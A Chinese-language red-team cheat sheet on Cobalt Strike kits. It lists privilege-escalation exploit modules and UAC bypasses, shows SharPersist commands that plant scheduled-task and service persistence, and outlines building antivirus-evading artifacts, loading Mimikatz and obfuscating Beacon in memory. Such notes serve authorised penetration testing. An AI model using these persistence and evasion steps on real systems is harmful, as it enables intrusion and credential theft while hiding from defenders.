# Cobalt Strike - 工具包 (Kits)

* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - 社区工具包 (Community Kit) 是一个由用户社区编写的扩展程序的中央存储库，用于扩展 Cobalt Strike 的功能。

## 提权工具包 (Elevate Kit)

UAC 令牌复制 (UAC Token Duplication)：已在 Windows 10 Red Stone 5 (2018 年 10 月) 中修复。

```powershell
beacon> runasadmin

Beacon 命令提权工具 (Command Elevators)
========================

    利用模块 (Exploit)              描述 (Description)
    -------                         -----------
    ms14-058                        TrackPopupMenu Win32k 空指针解引用 (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k 利用 (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav 本地权限提升 (CVE 2016-0051)
    svc-exe                         通过以服务形式运行的可执行文件获取 SYSTEM 权限
    uac-schtasks                    通过 schtasks.exe 绕过 UAC (利用 SilentCleanup)
    uac-token-duplication           通过令牌复制 (Token Duplication) 绕过 UAC
```

## 持久化工具包 (Persistence Kit)

* [0xthirteen/MoveKit](https://github.com/0xthirteen/MoveKit)
* [fireeye/SharPersist](https://github.com/fireeye/SharPersist)

    ```powershell
    # 列出持久化项目
    SharPersist -t schtaskbackdoor -m list
    SharPersist -t startupfolder -m list
    SharPersist -t schtask -m list

    # 添加持久化
    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
    SharPersist -t schtaskbackdoor -n "Something Cool" -m remove

    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
    SharPersist -t service -n "Some Service" -m remove

    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
    SharPersist -t schtask -n "Some Task" -m remove
    ```

## 资源工具包 (Resource Kit)

> 资源工具包 (Resource Kit) 是 Cobalt Strike 用来更改其工作流程中使用的 HTA、PowerShell、Python、VBA 和 VBS 脚本模板的手段。

## Artifact 工具包 (Artifact Kit)

> Cobalt Strike 使用 Artifact 工具包生成其可执行文件和 DLL。Artifact 工具包是一个源代码框架，用于构建能够规避某些防病毒产品的可执行文件和 DLL。Artifact 工具包构建脚本会为每种 Artifact 工具包技术创建一个包含模板 Artifact 的文件夹。要在 Cobalt Strike 中使用某种技术，请转到 Cobalt Strike -> Script Manager (脚本管理器)，然后从该技术的文件夹中加载 `artifact.cna` 脚本。

[Artifact Kit (Cobalt Strike 4.0)](https://www.youtube.com/watch?v=6mC21kviwG4)

* 下载 Artifact 工具包：`转到 Help -> Arsenal 以下载 Artifact Kit (需要授权版本的 Cobalt Strike)`
* 安装依赖项：`sudo apt-get install mingw-w64`
* 编辑 Artifact 代码
    * 更改命名管道 (pipename) 字符串
    * 更改 `patch.c`/`patch.exe` 中的 `VirtualAlloc`，例如：`HeapAlloc`
    * 更改导入 (Import)
* 构建 Artifact
* Cobalt Strike -> 脚本管理器 (Script Manager) > 加载 .cna

## Mimikatz 工具包 (Mimikatz Kit)

* 从军械库 (Arsenal) 下载并解压 .tgz 文件
* 加载 `mimikatz.cna` aggressor 脚本
* 像往常一样使用 mimikatz 功能

## 睡眠掩码工具包 (Sleep Mask Kit)

> 睡眠掩码工具包 (Sleep Mask Kit) 是睡眠掩码函数的源代码，在睡眠之前在内存中执行以混淆 Beacon。

使用随附的 `build.sh` 或 `build.bat` 脚本在 Kali Linux 或 Microsoft Windows 上构建睡眠掩码工具包。该脚本会在 `sleepmask` 目录中为三种类型的 Beacon（默认、SMB 和 TCP）构建针对 x86 和 x64 架构的睡眠掩码对象文件。默认类型支持 HTTP、HTTPS 和 DNS Beacon。

## 变异器工具包 (Mutator Kit)

> Cobalt Strike 引入的变异器工具包 (Mutator Kit) 是一款旨在创建 payload 中使用的“睡眠掩码 (sleep mask)”的唯一变异版本的工具，以规避静态签名的检测。它利用 LLVM 混淆技术来更改睡眠掩码，使内存扫描工具难以根据预定义模式识别掩码，从而增强红队活动的运维安全性 (OpSec)。

`OBFUSCATIONS` 变量可以是 `flattening`、`substitution`、`split-basic-blocks`、`bogus`。

```ps1
OBFUSCATIONS=substitution mutator.sh x64 -emit-llvm -S example.c -o example_with_substitutions.ll
mutator.sh x64 -c -DIMPL_CHKSTK_MS=1 -DMASK_TEXT_SECTION=1 -o sleepmask.x64.o src49/sleepmask.c
```

## 线程堆栈欺骗器 (Thread Stack Spoofer)

> 一种先进的内存中规避技术，通过欺骗线程调用堆栈 (Thread Call Stack) 来实现。这种技术允许绕过基于线程的内存检查规则，并在处理内存时更好地隐藏 shellcode。

线程堆栈欺骗器 (Thread Stack Spoofer) 现在在 Artifact 工具包中默认启用，可以通过配置文件 `arsenal_kit.config` 中的 `artifactkit_stack_spoof` 选项将其禁用。

## 参考资料 (References)

* [Introducing the Mutator Kit: Creating Object File Monstrosities with Sleep Mask and LLVM - @joehowwolf @HenriNurmi](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm)
